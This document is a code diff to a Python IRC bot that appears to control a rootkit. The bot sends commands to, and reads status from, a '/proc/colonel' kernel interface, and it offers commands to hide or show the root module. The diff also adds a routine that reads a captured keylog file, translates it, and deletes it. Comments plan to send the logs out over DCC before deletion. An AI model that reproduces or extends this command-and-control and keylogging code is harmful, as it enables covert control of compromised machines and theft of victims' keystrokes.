@@ -31,9 +31,11 @@ Bot commands are:
     mh -- Hide the root module. 
     ms -- Show the root module.
 """
+from os import remove
 import irc.bot
 import irc.strings
 from irc.client import ip_numstr_to_quad, ip_quad_to_numstr
+
 import key
 
 
@@ -88,14 +90,12 @@ class Bot(irc.bot.SingleServerIRCBot):
             self.dcc_connect(address, port)
 
     def root_command(self, cmd):
-        f = open("botcmdtest.txt", "w")
-        # f = open("/proc/colonel", "w")
+        f = open("/proc/colonel", "w")
         f.write(cmd)
         f.close()
 
     def root_status(self):
-        f = open("response.txt", "r")
-        # f = open("/proc/colonel", "r")
+        f = open("/proc/colonel", "r")
         s = f.read().split("\n")
         for n in reversed(range(len(s)-1)):
             if "STATUS" in s[n]:
@@ -103,17 +103,22 @@ class Bot(irc.bot.SingleServerIRCBot):
                 return s
         return
 
+    # Translate and print the keylog to console. Once finished, deletes file.
     def keylogs(self):
-        # Translate the logs and print to console (option to send DCC)
-        log = open('evlog.txt')  # CORRECT PATH
+        evlog = '/opt/col_log/evlog.txt'
+        log = open(evlog, 'r')
         f = log.read()
+        # MUST ADD DCC SEND BEFORE DELETING!!!!!
         log.close()
+        remove(evlog)
         kl = key.translate(f)
         return kl
 
 
     def error_log(self):
-        # Print error log to console (better to send DCC)
+        # SEND ERROR LOG VIA DCC THEN DELETE
+        # errlog = '/opt/col_log/log.txt'
+        # remove(errlog)
         pass
 
     def do_command(self, e, cmd):
